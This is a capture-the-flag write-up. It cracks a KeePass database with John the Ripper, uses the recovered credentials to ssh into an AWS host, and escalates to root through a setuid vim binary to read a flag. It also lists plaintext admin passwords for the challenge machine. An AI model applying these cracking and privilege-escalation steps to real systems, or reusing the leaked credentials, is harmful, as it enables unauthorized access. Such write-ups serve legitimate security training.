# Rayhaan's Return Solve

## Provided files: 

```
CTG-2020-10-0001.tar.gz
├── CTG-2021-02-19-001.iso
├── CTG-2021-02-19-40972240-MEMO.pdf
└── CTG_STANDARD_WORDLIST.txt
```

## Admin Creds

```
aws box
root: askjdd@#0a9seAVca;vse
ubuntu: As.3S;d0cvAS3kmm3VI(N
sysadmin: AS.cS/e:UY4(@_)ef

kdbx
kbdx: 1hodgson
```

## Solve

```sh
tar -xzvf CTG-2020-10-0001.tar.gz
sudo mount CTG-2021-02-19-001.iso /media/lread
cd /media/lread
ls
	total 28K
	drwxr-xr-x 3 root root 4.0K Feb 18 18:14 ./
	drwxr-xr-x 4 root root 4.0K Feb 11 15:40 ../
	drwx------ 2 root root  16K Feb 18 16:05 lost+found/
	-rw-r--r-- 1 root root 2.5K Feb 18 16:05 rhodgson.kdbx
``` 

Move the kdbx off disk. Binwalk errors when carving this disk image, so mounting is necessary.

```sh
file rhodgson.kdbx 
	rhodgson.kdbx: Keepass password database 2.x KDBX
~/src/john/run/keepass2john rhodgson.kdbx > hash
~/src/john/run/john --wordlist=./CTG-2020-10-0001/CTG_STANDARD_WORDLIST.txt hash
#(If you have already run this, then use ~/src/john/run/john --show hash)
	rhodgson:1hodgson
``` 

Open the kdbx using that password, `kpcli` is used here

```sh
kpcli:/> open rhodgson.kdbx
Please provide the master password: *************************
kpcli:/> pwd
/
kpcli:/> cd rhodgson/
kpcli:/rhodgson> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. My Flag Box                                               34.216.68.186
kpcli:/rhodgson> show 0 -f

Title: My Flag Box
Uname: ubuntu
 Pass: As.3S;d0cvAS3kmm3VI(N
  URL: 34.216.68.186
Notes: This aws thing is maybe useless cause I was messing with permissions, and now I cannot print the flag, and dont understand what I did when I was messing around with SUID bits. https://imgflip.com/i/4yladl

kpcli:/rhodgson> 
```

Using that, we ssh to the server

```sh
ssh ubuntu@34.216.68.186
ubuntu@34.216.68.186's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-1037-aws x86_64)

 <the usual ubuntu shit>

Last login: Thu Feb 18 10:31:29 2021 from 72.132.67.156
ubuntu@ip-172-31-24-45 ~ % 
```

We search for setuid binaries with permission 4000 or 4755 and use one to cat flag:

```sh
ubuntu@ip-172-31-24-45 ~ % ls
ubuntu@ip-172-31-24-45 ~ % ls -lah
total 96K
drwxr-xr-x 4 ubuntu ubuntu 4.0K Feb 19 02:50 .
drwxr-xr-x 4 root   root   4.0K Feb 18 10:27 ..
-rw------- 1 ubuntu ubuntu  842 Feb 18 10:21 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3.7K Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4.0K Feb 18 09:53 .cache
-rw------- 1 root   root     25 Feb 18 09:59 .flag
-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
drwx------ 2 ubuntu ubuntu 4.0K Feb 18 09:52 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 18 09:53 .sudo_as_admin_successful
-rw------- 1 root   ubuntu  719 Feb 18 09:59 .viminfo
-rw-rw-r-- 1 ubuntu ubuntu  48K Feb 18 10:11 .zcompdump
-rw------- 1 ubuntu ubuntu  614 Feb 19 02:50 .zsh_history
-rw-r--r-- 1 ubuntu ubuntu 1.3K Feb 18 10:11 .zshrc
ubuntu@ip-172-31-24-45 ~ % 
```

```
ubuntu@ip-172-31-24-45 ~ % find / -perm -4000 2>/dev/null
/snap/core18/1988/bin/mount
/snap/core18/1988/bin/ping
/snap/core18/1988/bin/su
/snap/core18/1988/bin/umount
/snap/core18/1988/usr/bin/chfn
/snap/core18/1988/usr/bin/chsh
/snap/core18/1988/usr/bin/gpasswd
/snap/core18/1988/usr/bin/newgrp
/snap/core18/1988/usr/bin/passwd
/snap/core18/1988/usr/bin/sudo
/snap/core18/1988/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1988/usr/lib/openssh/ssh-keysign
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign
/snap/snapd/10707/usr/lib/snapd/snap-confine
/snap/snapd/11036/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/at
/usr/bin/sudo
/usr/bin/vim.basic
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
ubuntu@ip-172-31-24-45 ~ % 
```

Notice vim.basic is setuid. We try this

```sh
ubuntu@ip-172-31-24-45 ~ % id 
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)
ubuntu@ip-172-31-24-45 ~ % vim
```

in vim

```
:!id
uid=1000(ubuntu) gid=1000(ubuntu) euid=0(root) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)
```

euid root! 

also in vim

```
:!cat .flag
osu{rAyh44n_is_b4d_@_0ps3c}
```
